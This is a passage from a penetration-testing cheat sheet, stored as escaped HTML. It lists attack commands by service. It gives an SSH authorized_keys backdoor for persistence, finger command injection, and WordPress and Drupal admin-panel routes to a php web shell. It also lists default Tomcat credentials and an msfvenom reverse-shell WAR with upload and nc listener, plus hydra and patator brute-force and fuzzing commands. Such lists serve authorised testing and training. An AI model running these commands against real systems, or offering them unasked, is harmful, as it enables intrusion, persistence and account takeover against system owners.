id=\"ssh-backdoor---post-exploitation\"\u003ESSH backdoor - post exploitation\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Attacker\nssh-keygen -f \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EFILENAME\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nchmod 600 \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EFILENAME\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\ncat \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EFILENAME\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E.pub -\u003E copy\n\n# Victim\necho \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EFILENAME\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E.pub \u003E\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPATH\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002F.ssh\u002Fauthorized_keys\n\n# Connect\nssh -i \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EFILENAME\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E@\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"dns---53\"\u003EDNS - 53\u003C\u002Fh2\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ednsenum \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDOMAIN\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ednsrecon -d \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDOMAIN\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"zone-transfert\"\u003EZone transfert\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ednsrecon -d \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDOMAIN\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -a\ndig axfr \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDOMAIN\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E @ns1.test.com\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"dns-brute-force\"\u003EDNS brute force\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehttps:\u002F\u002Fgithub.com\u002Fblark\u002Faiodnsbrute\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"finger---79\"\u003EFINGER - 79\u003C\u002Fh2\u003E\n\u003Ch3 id=\"user-enumeration\"\u003EUser enumeration\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Efinger @\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nfinger \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E@\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"command-execution\"\u003ECommand execution\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Efinger \"|\u002Fbin\u002Fid@\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\"\nfinger \"|\u002Fbin\u002Fls -a \u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\"\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"http---https---80---443\"\u003EHTTP - HTTPS - 80 - 443\u003C\u002Fh2\u003E\n\u003Ch3 id=\"automatic-scanners\"\u003EAutomatic scanners\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Enikto -h \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\npython crawleet.py -u \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -b -d 3 -e jpg,png,css -f -m -s -x php,txt -y --threads 20\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"wordpress\"\u003EWordpress\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Scan\nwpscan --rua -e --url \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\n# Brute force user(s)\nwpscan --rua --url \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -P \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORDS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -U \"\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E,\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\"\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"wordpress-panel-rce\"\u003EWordpress panel RCE\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003EModifying a php from the theme used (admin credentials needed)\n\nAppearance -\u003E Editor -\u003E 404 Template (at the right)\nChange the content for a php shell\nhttps:\u002F\u002Fraw.githubusercontent.com\u002Fflozz\u002Fp0wny-shell\u002Fmaster\u002Fshell.php\nhttp:\u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002Fwp-content\u002Fthemes\u002Ftwentytwelve\u002F404.php\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"drupal\"\u003EDrupal\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Edroopescan scan -u \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"username-enumeration\"\u003EUsername enumeration\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003EIn \u002Fuser\u002Fregister just try to create a username and if the name is already taken it will be notified :\n*The name admin is already taken*\n\nIf you request a new password for an existing username :\n*Unable to send e-mail. Contact the site administrator if the problem persists.*\n\nIf you request a new password for a non-existent username :\n*Sorry, test is not recognized as a user name or an e-mail address.*\n\nAccessing \u002Fuser\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003Enumber\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E you can see the number of existing users :\n    - \u002Fuser\u002F1 -\u003E Access denied (user exist)\n    - \u002Fuser\u002F2 -\u003E Page not found (user doesn't exist)\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"hidden-pages-enumeration\"\u003EHidden pages enumeration\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003EFuzz \u002Fnode\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ENUMBER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E where \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ENUMBER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E is a number (from 1 to 500 for example).\nYou could find hidden pages (test, dev) which are not referenced by the search engines.\n\nwfuzz -c -z range,1-500 --hc 404 \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002Fnode\u002FFUZZ\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"drupal-panel-rce\"\u003EDrupal panel RCE\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003EYou need the plugin php to be installed (check it accessing to \u002Fmodules\u002Fphp and if it returns a 403 then, exists, if not found, then the plugin php isn't installed)\n\nGo to Modules -\u003E (Check) PHP Filter  -\u003E Save configuration\n\nhttps:\u002F\u002Fraw.githubusercontent.com\u002Fflozz\u002Fp0wny-shell\u002Fmaster\u002Fshell.php\n\nThen click on Add content -\u003E Select Basic Page or Article -\u003E Write php shellcode on the body -\u003E Select PHP code in Text format -\u003E Select Preview\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"joomla\"\u003EJoomla\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ejoomscan -u \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n.\u002Fjoomlavs.rb --url \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -a -v\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"tomcat\"\u003ETomcat\u003C\u002Fh3\u003E\n\u003Ch4 id=\"default-credentials\"\u003EDefault credentials\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003EThe most interesting path of Tomcat is \u002Fmanager\u002Fhtml, inside that path you can upload and deploy war files (execute code). But  this path is protected by basic HTTP auth, the most common credentials are :\n\nadmin:admin\ntomcat:tomcat\nadmin:\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ENOTHING\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nadmin:s3cr3t\ntomcat:s3cr3t\nadmin:tomcat\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"brute-force-2\"\u003EBrute force\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehydra -L \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSERS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -P \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORDS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -f \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E http-get \u002Fmanager\u002Fhtml -vV -u\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"tomcat-panel-rce\"\u003ETomcat panel RCE\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Generate payload\nmsfvenom -p java\u002Fjsp_shell_reverse_tcp LHOST=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E LPORT=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -f war \u003E shell.war\n\n# Upload payload\nTomcat6 :\nwget 'http:\u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E:\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORD\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E@\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E:8080\u002Fmanager\u002Fdeploy?war=file:shell.war&amp;path=\u002Fshell' -O -\n\nTomcat7 and above :\ncurl -v -u \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E:\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORD\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -T shell.war 'http:\u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E:8080\u002Fmanager\u002Ftext\u002Fdeploy?path=\u002Fshellh&amp;update=true'\n\n# Listener\nnc -lvp \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\n# Execute payload\ncurl http:\u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E:8080\u002Fshell\u002F\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"webdav\"\u003EWebDav\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Edavtest -url \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"http-brute-force-authentication\"\u003EHTTP brute force authentication\u003C\u002Fh3\u003E\n\u003Ch4 id=\"http-basic-authentication\"\u003EHTTP basic authentication\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Hydra\nhydra -l \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -V -P \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORDS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -s 80 -f \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E http-get \u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL_ENDPOINT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002F -t 15\n\n# Patator\npython patator.py http_fuzz auth_type=basic url=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E user_pass=FILE0 0=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003E\u003Cspan class=\"token namespace\"\u003EUSER:\u003C\u002Fspan\u003EPASSWORD_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -x ignore:code=401 -x ignore:code=307\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"http-get-request\"\u003EHTTP GET request\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehydra \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -V -l \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -P \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORDS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E http-get-form \"\u002Flogin\u002F:username=^USER^&amp;password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid\" -t \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ETHREADS_NUMBER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"http-post-request\"\u003EHTTP POST request\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehydra -l \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -P \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORDS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E http-post-form \"\u002Fwebapp\u002Flogin.php:username=^USER^&amp;password=^PASS^:Invalid\" -t \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ETHREADS_NUMBER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"spidering--brute-force-directories--files\"\u003ESpidering \u002F Brute force directories \u002F files\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Egospider -d \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDEPTHS\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E --robots --sitemap -t \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ETHREADS\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -s \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\nffuf -w \u002Fhome\u002Fliodeus\u002Fdirectory-list-lowercase-2.3-medium.txt -u \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002FFUZZ -e .php,.txt -t \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token 